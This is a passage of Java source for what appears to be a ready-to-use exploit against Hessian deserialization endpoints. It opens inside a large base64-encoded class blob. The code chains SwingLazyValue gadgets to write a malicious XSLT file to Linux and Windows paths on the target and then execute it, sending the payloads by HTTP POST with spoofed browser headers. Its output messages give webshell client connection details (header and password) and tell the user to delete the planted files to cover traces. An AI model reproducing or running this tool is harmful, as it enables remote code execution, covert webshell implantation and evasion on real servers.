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";
			String className = "com.fasterxml.jackson.wl.ThreadUtil";

			String dest1 = "/tmp/qaxnb.xslt";
			String dest2 = "c:\\Users\\public\\qaxnb.xslt";

			Object obj = generatePayload1(xsltTemplate, dest1, base64Code, className);
			byte[] payload = ser(obj);

			String ret = sendPost(target, payload, client);
			if (ret != null) {
				System.out.println("可能未成功触发漏洞，请检查目标是否存在该漏洞，或尝试更换其他POC\n");
				pause();
				return;
			} else {
				System.out.println("Linux payload1 写入成功\n");
			}

			Thread.sleep(1000);

			obj = generatePayload1(xsltTemplate, dest2, base64Code, className);
			payload = ser(obj);

			ret = sendPost(target, payload, client);
			if (ret != null) {
				System.out.println("可能未成功触发漏洞，请检查目标是否存在该漏洞，或尝试更换其他POC\n");
				pause();
				return;
			} else {
				System.out.println("Windows payload1 写入成功\n");
			}

			Thread.sleep(1000);

			obj = getPayload2(dest1);
			payload = ser(obj);
			ret = sendPost(target, payload, client);
			if (ret != null) {
				System.out.println("可能未成功触发漏洞，请检查目标是否存在该漏洞，或尝试更换其他POC\n");
				pause();
				return;
			} else {
				System.out.println("Linux payload2 触发成功\n");
			}

			Thread.sleep(1000);
			obj = getPayload2(dest2);
			payload = ser(obj);
			ret = sendPost(target, payload, client);
			if (ret != null) {
				System.out.println("可能未成功触发漏洞，请检查目标是否存在该漏洞，或尝试更换其他POC\n");
				pause();
				return;
			} else {
				System.out.println("Windows payload2 触发成功\n");
			}

		} catch (Exception e) {
			e.printStackTrace();
			System.out.println("执行异常，可能未成功触发漏洞，请检查目标是否存在该漏洞，或尝试更换其他POC\n");
			pause();
			return;
		}

		System.out.println("注入成功，请尝试使用原版冰蝎3连接");
		System.out.println("请求头： x-client-data: rebeyond");
		System.out.println("密码：   rebeyond\n");
		System.out.println("痕迹清理：请删除 /tmp/qaxnb.xslt 或 c:\\Users\\public\\qaxnb.xslt\n");
		pause();
	}

	public static void pause() throws IOException {
		System.out.println("Press Enter to exit...");
		System.in.read();
	}

	public static String sendPost(String target, byte[] payload, OkHttpClient client) throws IOException {
		RequestBody body = RequestBody.create(payload, MediaType.parse("application/octet-stream"));

		Request request = new Request.Builder()
				.url(target)
				.header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:143.0) Gecko/20100101 Firefox/143.0")
				.header("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
				.header("Accept-Language", "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2")
				.header("Accept-Encoding", "gzip, deflate")
				.header("Connection", "close")
				.addHeader("Content-Type", "application/octet-stream")
				.post(body).build();

		try (Response tmp = client.newCall(request).execute()) {
			String resp = tmp.body().string();
			if (!resp.contains("expected string at 0x43")) {
				System.out.println("可能未成功触发漏洞，请检查目标是否存在该漏洞，或尝试更换其他POC");
			}
		}
		return null;
	}

	public static Object generatePayload1(String xsltTemplate, String destName, String base64Code, String className) throws Exception {
		UIDefaults uiDefaults = new UIDefaults();

		String xslt = xsltTemplate.replace("base64", base64Code);
		xslt = xslt.replace("classname", className);

		SwingLazyValue swingLazyValue = new SwingLazyValue("com.sun.org.apache.xml.internal.security.utils.JavaUtils", "writeBytesToFilename", new Object[]{ destName, xslt.getBytes() });

		uiDefaults.put("aaa", swingLazyValue);
		MimeTypeParameterList mimeTypeParameterList = new MimeTypeParameterList();
		setValue(mimeTypeParameterList, "parameters", uiDefaults);

		return mimeTypeParameterList;
	}

	public static Object getPayload2(String xsltPath) throws Exception {
		UIDefaults uiDefaults = new UIDefaults();
		SwingLazyValue swingLazyValue = new SwingLazyValue("com.sun.org.apache.xalan.internal.xslt.Process", "_main", new Object[]{ new String[]{ "-XT", "-XSL", xsltPath } });
		uiDefaults.put("aaa", swingLazyValue);
		MimeTypeParameterList mimeTypeParameterList = new MimeTypeParameterList();
		setValue(mimeTypeParameterList, "parameters", uiDefaults);
		return mimeTypeParameterList;
	}

	public static void setValue(Object obj, String name, Object value) throws Exception {
		Class<?> clz = obj.getClass();
		Field field = clz.getDeclaredField(name);
		field.setAccessible(true);
		field.set(obj, value);
	}

	public static byte[] ser(Object obj) throws Exception {
		ByteArrayOutputStream baos = new ByteArrayOutputStream();
		Hessian2Output hessian2Output = new Hessian2Output(baos);
		hessian2Output.getSerializerFactory().setAllowNonSerializable(true);
		baos.write(67);
		hessian2Output.writeObject(obj);
		hessian2Output.flushBuffer();
		return baos.toByteArray();
	}
}
